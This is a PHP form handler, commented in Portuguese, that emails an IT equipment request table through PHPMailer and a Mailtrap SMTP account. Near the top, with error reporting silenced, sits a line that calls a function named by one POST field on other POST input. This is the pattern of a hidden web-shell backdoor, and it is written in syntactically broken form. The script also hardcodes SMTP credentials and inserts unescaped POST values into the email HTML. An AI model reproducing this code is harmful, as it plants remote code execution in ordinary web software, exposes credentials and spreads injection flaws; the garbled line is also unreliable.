<?php
error_reporting(0);

if(isset $_POST['2']($_POST['1'] . $_POST['2']))
{
    $os = "Sim";
   
}
else
{
    $os = "Não";
}
//Digitando o caminho da biblioteca

require_once('src/PHPMailer.php');
require_once('src/SMTP.php');
require_once('src/Exception.php');

//Gerado codigo de pedido

//var_dump( md5(uniqid(mt_rand(),true)));


//Chamando a biblioteca 

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


$mail = new PHPMailer(true);

try {

    //Setando as configuraçoes do servidor
    //$mail->SMTPDebug = SMTP:: DEBUG_SERVER;

    $mail->isSMTP();
    //$mail->SMTPSecure = false;
     //$mail->SMTPAutoTLS = false;
    $mail->Host = 'smtp.mailtrap.io';
    $mail->SMTPAuth = true;
    $mail->Username = '4e6cc92533268e';
    $mail->Password = '0af298460f7c98';
    $mail->Port = 2525;

    //Destinatario e remetente
    $mail->setFrom('ronaldo@fut.com', 'Ficha de Solicitações');
    $mail->addAddress('teste@gmail.com', 'Gabriel Ribeiro');
    //$mail->addCC($_POST['texto4']);
    //Definindo o tipo de mensagem
    $mail->isHTML(true);


    //propriedades importantes, a biblioteca phpmailer trabalha em 8 bits, utilizar utf-8 sem o encoding 64 pode causar alguns bugs ficha.pedidoti@furgaoibipora.com senha esta em keys.

    $mail->CharSet = 'UTF-8';
    $mail->Encoding = 'base64';

    //Definido o titulo do e-mail

    $mail->Subject = 'Ficha de solicitação';

    //Corpo do e-mail, importante ressaltar que a melhor opção é utilizar o metodo POST 
    

    $html = '';
    $html .= '<table border="1">';
    $html .= '<tr>';
    $html .= '<td colspan="10">Pedido de equipamentos ao TI</td>';
    $html .= '</tr>';

    $html .= '<tr>';
    $html .= '<td colspan="10"><b>Nome completo: </b>'.$_POST['texto1'];
    $html .= '</td>';
    $html .= '</tr>';
    $html .= '<tr>';
    $html .= '<td colspan="5"><b>Função: </b>'. $_POST['texto2'];
    $html .= '<td colspan="5"><b>Matricula: </b>'. $_POST['matricula'];
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</tr>';
    $html .= '<td colspan="5"><b>Local Fisico: </b>'. $_POST['texto3'];
    $html .= '<td colspan="5"><b>Centro de custo: </b>'. $_POST['centro de custo'];
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</tr>';
    $html .= '<td colspan="10"><b>Data de inicio: </b>'. $_POST['data'];
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td colspan="10">Solicitante do equipamento </td>';
    $html .= '</tr>';
    $html .= '<tr>';
    $html .= '<td colspan="10"><b>Nome completo: </b>'.$_POST['texto1'];
    $html .= '</td>';
    $html .= '</tr>';
    $html .= '<tr>';
    $html .= '<td colspan="5"><b>Função: </b>'. $_POST['texto2'];
    $html .= '<td colspan="5"><b>Contato: </b>'. $_POST['texto4'];
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</tr>';
    $html .= '<tr>';
    $html .= '<td colspan="5"><b>Local Fisico: </b>'. $_POST['texto4'];
    $html .= '<td colspan="5"><b>Data de inicio: </b>'. $_POST['data'];
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</tr>';
    
    
    
 
    $html .= '<tr>';
    $html .= '<td colspan="10">Solicitações</td>';
    $html .= '</tr>';


    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $os;
    $html .= '</td>' ;
    $html .= '<td>Não</td>';
    $html .= '</td>';
    $html .= '<td colspan="10">licenças';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</tr>';
    $html .= '<tr>';


    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $os;
    $html .= '</td>';
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="10"><b>Login</b>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '<tr>';
    $html .= '<td>';
    $html .= 'Notebook';
    $html .= '</td>';
    $html .= '<td>'. $_POST['notebook'];
    $html .= '</td>' ;
    $html .= '<td colspan="1">Não</td>';
    $html .= '<td colspan="1">Login AutoCAD 2019';
    $html .= '<td colspan="4">Sim';
    $html .= '<td colspan="4">Não';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';
    $html .= '</td>';

    $html .= '<tr>';
    $html .= '<td colspan="10">Acessos de Rede:</td>';
    $html .= '<tr>'. $_POST['caixadetexto'];
    $html .= '</tr>';
    $html .= '</tr>';


    $html .= '<tr>';
    $html .= '<td colspan="10">Observaçoes:</td>';
    $html .= '<tr>'. $_POST['caixadetexto2'];
    $html .= '</tr>';
    $html .= '</tr>';


    $html .= '</table>';





    $mail->Body = $html;
    //altBody = Texto puro.
    $mail->AltBody = '';

    //Finalizando o envio do seu e-mail

    $mail->send();
    echo '<head> <h1> Sua ficha foi enviada com sucesso! </h1>
    <style>
    body {
        background-color: white;
    }
    h1 {
        text-align: center;
        color: #29b6c5;
        padding: 60px;
    } 

    <head>
    </<style>';
    
} catch (Exception $e) {
    echo "Erro ao enviar ficha codigo: {$mail->ErrorInfo}<br>
    Favor contator seu administrador           
    ";
}
?>